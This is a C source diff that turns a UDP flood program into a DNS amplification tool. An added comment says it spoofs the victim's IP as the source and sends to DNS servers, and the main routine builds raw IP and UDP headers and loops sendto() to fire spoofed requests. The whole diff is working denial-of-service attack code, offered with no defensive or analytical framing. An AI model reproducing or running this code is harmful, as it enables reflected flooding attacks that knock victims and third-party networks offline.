@@ -4,11 +4,13 @@
 #include "constants.h"
 #include <stdio.h>
 // Arguments standarized and checked //
+
 // Respects executable [--source-addr saddr --[remote|broadcast]-addr raddr --source-port sport [--remote-port rport] [--n N]] //
 
+/** Spoofs victim ip in source address, dns address in remote address, remote port is dns port, and source port can be random **/
 int main(int argc,char* argv[]){
 	srand(time(NULL));
-    if(argc!=11) fprintf(stdout,"Usage: udp-flood --source-addr saddr --remote-addr raddr --source-port sport --remote-port rport  --n N\n");
+    if(argc!=11){ fprintf(stdout,"Usage: dns-amplification-udp --source-addr saddr --remote-addr raddr --source-port sport -remote-port rport --n N\n"); exit(0); }
 	else{	
 		
 		/** Example source address and source port **/
@@ -37,15 +39,18 @@ int main(int argc,char* argv[]){
 		/** Use auxiliar functions to warn of current status **/
 		SHOW_CREATED_IP_HEADER(ip_hdr);
 		
-		set_udp_header(udp_hdr,source_port,remote_port,64,0);
+		set_udp_header(udp_hdr,source_port,remote_port,46,0);
 		SHOW_CREATED_UDP_HEADER(tcp_hdr);
 
 		/** Notice the kernel that we doesn't need it fill the header **/
 		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
 		
-		/** Run your application type (UDP flood in this case)**/
-		run_flood(sock,iter,ip_hdr,&myaddr,buffer);
-	
+		/** Application **/
+		int i,sent=0;
+		for(i=0;i<iter;i++){
+			if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr *)&myaddr, sizeof(myaddr))>=0) sent++;
+		}
+		fprintf(stdout,"Sent %d dns spoofed requests\n",sent);
 	
 	}
 	return 0;
